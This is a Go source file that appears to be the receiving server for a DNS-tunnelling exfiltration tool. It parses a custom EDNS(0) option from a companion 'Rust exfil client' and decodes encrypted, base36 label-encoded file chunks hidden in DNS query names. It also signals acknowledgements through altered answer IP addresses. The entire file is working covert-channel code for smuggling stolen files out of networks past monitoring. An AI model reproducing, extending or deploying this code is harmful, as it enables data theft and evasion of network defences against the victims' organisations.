package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
)

type DNSHeader struct {
	ID      uint16
	Flags   uint16
	QDCount uint16
	ANCount uint16
	NSCount uint16
	ARCount uint16
}

type DNSQuestion struct {
	Name  string
	Type  uint16
	Class uint16
}

type DNSResourceRecord struct {
	Name     string
	Type     uint16
	Class    uint16
	TTL      uint32
	RDLength uint16
	RData    []byte
}

// DNSMessage represents a full DNS packet with header and sections.
type DNSMessage struct {
	Header      DNSHeader
	Questions   []DNSQuestion
	Answers     []DNSResourceRecord
	Authorities []DNSResourceRecord
	Additionals []DNSResourceRecord
}

// ExfilMetadata captures the EDNS(0) option payload sent by the Rust exfil client.
type ExfilMetadata struct {
	Version     uint8
	Flags       uint8
	SessionID   uint32
	JobID       uint32
	ChunkIndex  uint32
	TotalChunks uint32
	PayloadLen  uint16
	FileSize    uint64
	Name        string
	Raw         []byte // raw option bytes for debugging or forward compatibility
}

type ExfilFramePhase int

const (
	ExfilFrameInit ExfilFramePhase = iota
	ExfilFrameChunk
	ExfilFrameComplete
)

// ExfilFrame represents a label-encoded frame emitted by the dedicated exfil client.
type ExfilFrame struct {
	Phase      ExfilFramePhase
	SessionTag string
	Counter    uint32
	Payload    string
	Flags      uint8
}

type frameEnvelope struct {
	Version    uint8
	Flags      uint8
	SessionTag string
	Counter    uint32
}

// IsHeader reports whether the metadata represents the header frame.
func (m *ExfilMetadata) IsHeader() bool {
	if m == nil {
		return false
	}
	return (m.Flags & ExfilFlagHeader) != 0
}

// IsFinal reports whether the chunk carries the final payload.
func (m *ExfilMetadata) IsFinal() bool {
	if m == nil {
		return false
	}
	return (m.Flags & ExfilFlagFinalChunk) != 0
}

// extractExfilMetadata scans the additional section for our EDNS option.
func extractExfilMetadata(msg DNSMessage) (*ExfilMetadata, error) {
	for _, rr := range msg.Additionals {
		if rr.Type != 41 { // OPT record
			continue
		}
		meta, err := parseExfilOption(rr.RData)
		if err != nil {
			return nil, err
		}
		if meta != nil {
			return meta, nil
		}
	}
	return nil, nil
}

// parseExfilOption extracts the first matching exfil option from the OPT RDATA.
func parseExfilOption(rdata []byte) (*ExfilMetadata, error) {
	off := 0
	for off+4 <= len(rdata) {
		code := binary.BigEndian.Uint16(rdata[off : off+2])
		length := binary.BigEndian.Uint16(rdata[off+2 : off+4])
		off += 4
		if off+int(length) > len(rdata) {
			return nil, errors.New("edns option truncated")
		}
		if code == ExfilOptionCode {
			payload := rdata[off : off+int(length)]
			meta, err := parseExfilMetadataPayload(payload)
			if err != nil {
				return nil, err
			}
			return meta, nil
		}
		off += int(length)
	}
	return nil, nil
}

func parseExfilMetadataPayload(payload []byte) (*ExfilMetadata, error) {
	const headerLen = 1 + 1 + 4 + 4 + 4 + 4 + 2 + 8 + 1
	if len(payload) < headerLen {
		return nil, fmt.Errorf("exfil option too short: %d", len(payload))
	}
	off := 0
	meta := &ExfilMetadata{Raw: append([]byte(nil), payload...)}
	meta.Version = payload[off]
	off++
	meta.Flags = payload[off]
	off++
	meta.SessionID = binary.LittleEndian.Uint32(payload[off : off+4])
	off += 4
	meta.JobID = binary.LittleEndian.Uint32(payload[off : off+4])
	off += 4
	meta.ChunkIndex = binary.LittleEndian.Uint32(payload[off : off+4])
	off += 4
	meta.TotalChunks = binary.LittleEndian.Uint32(payload[off : off+4])
	off += 4
	meta.PayloadLen = binary.LittleEndian.Uint16(payload[off : off+2])
	off += 2
	meta.FileSize = binary.LittleEndian.Uint64(payload[off : off+8])
	off += 8
	nameLen := int(payload[off])
	off++
	if nameLen > 0 {
		if off+nameLen > len(payload) {
			return nil, errors.New("exfil option name truncated")
		}
		meta.Name = string(payload[off : off+nameLen])
		off += nameLen
	}

	if meta.Version != ExfilProtocolVersion {
		return nil, fmt.Errorf("unsupported exfil protocol version %d", meta.Version)
	}

	return meta, nil
}

func parseLabelEncodedExfilFrame(qname string, domains []string, aesKey []byte) (*ExfilFrame, bool, error) {
	normalizedName := strings.TrimSuffix(strings.ToLower(qname), ".")
	if normalizedName == "" {
		return nil, false, nil
	}

	nameParts := strings.Split(normalizedName, ".")
	for _, domain := range domains {
		normDomain := strings.TrimSpace(domain)
		if normDomain == "" {
			continue
		}
		normDomain = strings.TrimSuffix(strings.ToLower(normDomain), ".")
		domainParts := strings.Split(normDomain, ".")
		if len(nameParts) <= len(domainParts) || !labelsHaveSuffix(nameParts, domainParts) {
			continue
		}

		frameLabels := append([]string(nil), nameParts[:len(nameParts)-len(domainParts)]...)
		if len(frameLabels) < 2 {
			continue
		}

		if last := frameLabels[len(frameLabels)-1]; isLikelyTimestampLabel(last) {
			frameLabels = frameLabels[:len(frameLabels)-1]
		}
		if len(frameLabels) < 2 {
			continue
		}

		frame, err := interpretEncryptedFrameLabels(frameLabels, aesKey)
		return frame, true, err
	}

	return nil, false, nil
}

func interpretEncryptedFrameLabels(labels []string, aesKey []byte) (*ExfilFrame, error) {
	if len(labels) != 2 {
		return nil, fmt.Errorf("expected 2 labels, got %d", len(labels))
	}

	metaLabel := labels[0]
	payloadLabel := labels[1]
	upperMeta := strings.ToUpper(metaLabel)
	if !strings.HasPrefix(upperMeta, ExfilMetadataPrefix) {
		return nil, fmt.Errorf("label missing exfil prefix")
	}
	encoded := metaLabel[len(ExfilMetadataPrefix):]
	if encoded == "" {
		return nil, fmt.Errorf("metadata label missing ciphertext")
	}

	plaintext, err := decodeAndDecryptBytes(encoded, aesKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt metadata label: %w", err)
	}
	envelope, err := parseFrameEnvelopePayload(plaintext)
	if err != nil {
		return nil, err
	}

	frame := &ExfilFrame{
		SessionTag: envelope.SessionTag,
		Counter:    envelope.Counter,
		Flags:      envelope.Flags,
	}

	switch {
	case envelope.Flags&FrameEnvelopeFlagInit != 0:
		frame.Phase = ExfilFrameInit
	case envelope.Flags&FrameEnvelopeFlagComplete != 0:
		frame.Phase = ExfilFrameComplete
	case envelope.Flags&FrameEnvelopeFlagChunk != 0:
		frame.Phase = ExfilFrameChunk
	default:
		return nil, fmt.Errorf("envelope missing phase flag (flags=0x%x)", envelope.Flags)
	}

	payload := strings.ToLower(payloadLabel)
	if payload == strings.ToLower(ExfilPadLabel) {
		payload = ""
	}
	if frame.Phase == ExfilFrameChunk {
		if payload == "" {
			return nil, fmt.Errorf("chunk frame missing payload label")
		}
		if !isBase36Label(payload) {
			return nil, fmt.Errorf("chunk payload label is not base36")
		}
		frame.Payload = payload
	} else {
		frame.Payload = payload
	}

	return frame, nil
}

func parseFrameEnvelopePayload(payload []byte) (*frameEnvelope, error) {
	minLen := 1 + 1 + FrameEnvelopeTagLength + 4
	if len(payload) < minLen {
		return nil, fmt.Errorf("envelope too short (%d bytes)", len(payload))
	}
	env := &frameEnvelope{
		Version:    payload[0],
		Flags:      payload[1],
		SessionTag: string(payload[2 : 2+FrameEnvelopeTagLength]),
		Counter:    binary.LittleEndian.Uint32(payload[2+FrameEnvelopeTagLength : 2+FrameEnvelopeTagLength+4]),
	}
	if env.Version != FrameEnvelopeVersion {
		return nil, fmt.Errorf("unsupported envelope version %d", env.Version)
	}
	if len(env.SessionTag) != ExfilSessionTagWidth || !strings.HasPrefix(env.SessionTag, ExfilSessionTagPrefix) {
		return nil, fmt.Errorf("invalid session tag %q", env.SessionTag)
	}
	env.SessionTag = strings.ToUpper(env.SessionTag)
	return env, nil
}

// extractExfilPayloadFromQName removes the configured domain/timestamp labels and returns the base36 blob.
func extractExfilPayloadFromQName(qname, domain string) (string, bool) {
	normalizedName := strings.TrimSuffix(strings.ToLower(qname), ".")
	normalizedDomain := strings.TrimSuffix(strings.ToLower(domain), ".")
	if normalizedName == "" || normalizedDomain == "" {
		return "", false
	}

	nameParts := strings.Split(normalizedName, ".")
	domainParts := strings.Split(normalizedDomain, ".")
	if len(nameParts) <= len(domainParts) || !labelsHaveSuffix(nameParts, domainParts) {
		return "", false
	}

	labels := append([]string(nil), nameParts[:len(nameParts)-len(domainParts)]...)
	if len(labels) == 0 {
		return "", false
	}

	last := labels[len(labels)-1]
	if isLikelyTimestampLabel(last) {
		labels = labels[:len(labels)-1]
	}
	if len(labels) == 0 {
		return "", false
	}

	for _, label := range labels {
		if !isBase36Label(label) {
			return "", false
		}
	}

	encoded := strings.Join(labels, "")
	return encoded, encoded != ""
}

func labelsHaveSuffix(nameParts, domainParts []string) bool {
	if len(domainParts) == 0 || len(domainParts) > len(nameParts) {
		return false
	}
	nameIdx := len(nameParts) - len(domainParts)
	for i := range domainParts {
		if domainParts[i] != nameParts[nameIdx+i] {
			return false
		}
	}
	return true
}

func isBase36Label(label string) bool {
	if label == "" {
		return false
	}
	for _, ch := range label {
		if ch >= '0' && ch <= '9' {
			continue
		}
		if ch >= 'a' && ch <= 'z' {
			continue
		}
		return false
	}
	return true
}

func isLikelyTimestampLabel(label string) bool {
	if len(label) < UnixTimestampMinLength || len(label) > UnixTimestampMaxLength {
		return false
	}
	for _, ch := range label {
		if ch < '0' || ch > '9' {
			return false
		}
	}
	return true
}

// ackIPAddress returns the server IP or +1 (wrap last octet) for ACK signaling.
func ackIPAddress(base string, ack bool) []byte {
	ip, ok := toIPv4(base)
	if !ok || len(ip) != 4 {
		return []byte{127, 0, 0, 1}
	}
	if !ack {
		return ip
	}
	result := append([]byte(nil), ip...)
	result[3] = byte((int(result[3]) + 1) & 0xFF)
	return result
}

func buildExfilDomainHints(primary string, extras []string) []string {
	seen := make(map[string]struct{})
	var domains []string
	add := func(domain string) {
		norm := strings.TrimSpace(strings.ToLower(strings.TrimSuffix(domain, ".")))
		if norm == "" {
			return
		}
		if _, exists := seen[norm]; exists {
			return
		}
		seen[norm] = struct{}{}
		domains = append(domains, norm)
	}

	add(primary)
	for _, extra := range extras {
		add(extra)
	}

	return domains
}
